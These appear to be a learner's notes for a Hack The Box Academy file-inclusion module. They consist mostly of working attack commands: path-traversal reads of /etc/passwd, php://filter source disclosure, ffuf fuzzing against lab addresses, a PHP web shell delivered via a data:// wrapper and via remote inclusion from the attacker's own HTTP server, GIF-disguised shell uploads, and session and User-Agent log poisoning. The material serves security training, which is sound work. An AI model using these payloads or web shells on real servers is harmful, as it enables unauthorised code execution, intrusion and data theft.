languages/....//....//....//....//etc/passwd
-first fuzz for php files 
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u http://154.57.164.77:30301/FUZZ.php
```


the read the configuration file
```
php://filter/read=convert.base64-encode/resource=config
```

https://academy.hackthebox.com/app/module/23/section/253

check the php configuration for the allow_url_include to see its value

```
theo854@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

```
theo854@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

RCE
```
theo854@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

Remote Code Execution with RFI
```
theo854@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```
theo854@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/)
```

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

https://www.scribd.com/document/914603626/File-Inclusion

RCE via LFI uploads using zip include and phar
https://academy.hackthebox.com/app/module/23/section/1493
```
theo854@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
inspect the page to get the uploaded file path
```
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

lfi wordlist https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI

Log Poisoning
`/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
Server Log Poisoning
```
theo854@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
theo854@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

-s silent mode for ffuf
Fuzzing Parameters
```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt  -u 'http://154.57.164.79:30497/index.php?FUZZ=calue' -fs 2309 -s
```
LFI wordlist
```
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://154.57.164.79:30497/index.php?view=FUZZ' -fs 1935

```

find / -type f -name php.ini 2>/dev/null find the file 
https://medium.com/@0xBlk/skills-assessment-file-inclusion-write-up-d3cf6e40adf1
https://dustindikes.com/blog/htb-skills-assessment-lfi.html
Assessment
-see that the page uses get requests to add photos in the contact.php page
-fuzz the path with the api wordlists /api/image.php?p=FUZZ
-....//....//....//....//etc/passwd gets returned see that you can find also read the source code php://filter/read=convert.base64-encode/resource=<FILE_PATH>
-find a vulnerability in the region parameter url encode the md5hash for the shell 2 times to bypass

